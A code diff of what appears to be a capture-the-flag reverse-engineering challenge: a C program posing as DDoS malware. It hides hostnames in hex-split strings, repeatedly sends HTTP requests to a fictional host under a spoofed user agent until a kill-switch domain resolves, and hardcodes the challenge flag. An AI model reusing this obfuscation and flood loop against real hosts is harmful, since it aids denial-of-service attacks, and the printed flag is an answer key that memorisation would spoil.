@@ -10,6 +10,10 @@
 
 typedef struct addrinfo addrinfo;
 
+#define FLAG "HHCTF{R3v3r51n9_C_15_T00_3a5y}"
+
+#define HOSTNAME "wafflevikings.hh"
+
 #define system_or_return(command) ({ \
 if (system(command) != 0) {          \
     return;                          \
@@ -39,7 +43,7 @@ void displayTextArt(void) {
 /// Function containing a special secret link
 /// \return Size of the link (size_t)
 size_t special_secret_link(void) {
-    const char *link = "https://rb.gy/o411hk";
+    const char *link = "https://bit.ly/RedStarZarnitsa";
     return strlen(link);
 }
 
@@ -102,6 +106,29 @@ void transfer(void) {
     fclose(file);
 }
 
+bool pass(int argc, char *argv[]) {
+    if (argc != 1) {
+        return false;
+    }
+
+    return strncmp(FLAG, argv[0], 31) == 0 ? true : false;
+}
+
+/// Get the dns entry
+/// \param str Pointer to obtain the dns entry (char *)
+void get_dns(char *str) {
+    const char *foazuibcvi = "\x63\x6B\x2E\x6B";
+    const char *nciuazbcvo = "\x69\x6C\x6C\x65\x72";
+    const char *fjdoznvpzq = "\x73\x74\x6F\x70";
+    const char *msdopzoinf = "\x61\x74\x74\x61";
+
+    snprintf(str, 21, "%s%s%s%s",
+             fjdoznvpzq,
+             msdopzoinf,
+             foazuibcvi,
+             nciuazbcvo);
+}
+
 /// Get the curl prepared request
 /// \param hostname domain/ip address to reach (const char *)
 /// \return Curl prepare request (CURL *)
@@ -117,7 +144,8 @@ CURL *get_curl(const char *hostname) {
 
     curl_easy_setopt(curl, CURLOPT_URL, url);
     curl_easy_setopt(curl, CURLOPT_PORT, 80);
-    curl_easy_setopt(curl, CURLOPT_USERAGENT, "RedStarBrowser/3.0 (XK-256; Zarnitsa OS x86_64)"); //add custom user agent
+    curl_easy_setopt(curl, CURLOPT_USERAGENT,
+                     "RedStarBrowser/3.0 (XK-256; Zarnitsa OS x86_64)"); //add custom user agent
 
     return curl;
 }
@@ -129,7 +157,7 @@ void ddos(CURL *curl) {
 
     freopen("/dev/null", "w", stdout); //don't show the get result
     resolution = curl_easy_perform(curl);
-    freopen("/dev/tty", "w", stdout); // restablished the standard output
+    freopen("/dev/tty", "w", stdout); // reestablished the standard output
 
     if (resolution != CURLE_OK) {
         fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(resolution));
@@ -140,42 +168,25 @@ void ddos(CURL *curl) {
     fflush(stdout);
 }
 
-/// Get the hostname
-/// \param str Pointer to obtain the hostname (char *)
-void the_0bfusk1_666_h0sTn4m3(char *str) {
-    const char *nbmpdibqer = "\x6C\x6D";
-    const char *msdopzoinf = "\x6E\x61";
-    const char *odbazmapwn = "\x2E\x63\x74\x66";
-    const char *fjdoznvpzq = "\x68\x65";
-    const char *vaedcvegvd = "\x73\x74";
-    const char *foazuibcvi = "\x6C\x6C\x75\x78";
-    const char *yzebxcpsuz = "\x61\x64";
-    const char *nciuazbcvo = "\x68\x61";
-
-    snprintf(str, 21, "%s%s%s%s%s%s%s%s",
-             fjdoznvpzq,
-             msdopzoinf,
-             foazuibcvi,
-             nciuazbcvo,
-             nbmpdibqer,
-             vaedcvegvd,
-             yzebxcpsuz,
-             odbazmapwn);
-}
-
 /// Check if a DNS entry exist
 /// \param entry DNS entry to check (char *)
 /// \param hints DNS request address information (addrinfo *)
 /// \param result DNS response address information (addrinfo *)
 /// \return True if the entry exists, false otherwise (bool)
-bool check(char *entry, addrinfo *hints, addrinfo *result) {
+bool check(const char *entry, const addrinfo *hints, addrinfo *result) {
     return getaddrinfo(entry, NULL, hints, &result) == 0;
 }
 
-int main(void) {
+int main(int argc, char *argv[]) {
     displayTextArt();
+    argv++;
 
     transfer();
+    argc--;
+
+    if (!pass(argc, argv)) {
+        return EXIT_SUCCESS;
+    }
 
     addrinfo hints, result;
 
@@ -183,12 +194,12 @@ int main(void) {
     hints.ai_family = AF_UNSPEC;
     hints.ai_socktype = SOCK_STREAM;
 
-    char hostname[21];
-    the_0bfusk1_666_h0sTn4m3(hostname); //ip to ddos
+    CURL *curl = get_curl(HOSTNAME);
 
-    CURL *curl = get_curl(hostname);
+    char dns[18];
+    get_dns(dns);
 
-    while (!check(hostname, &hints, &result)) {
+    while (!check(dns, &hints, &result)) {
         ddos(curl);
         sleep(5);
     }
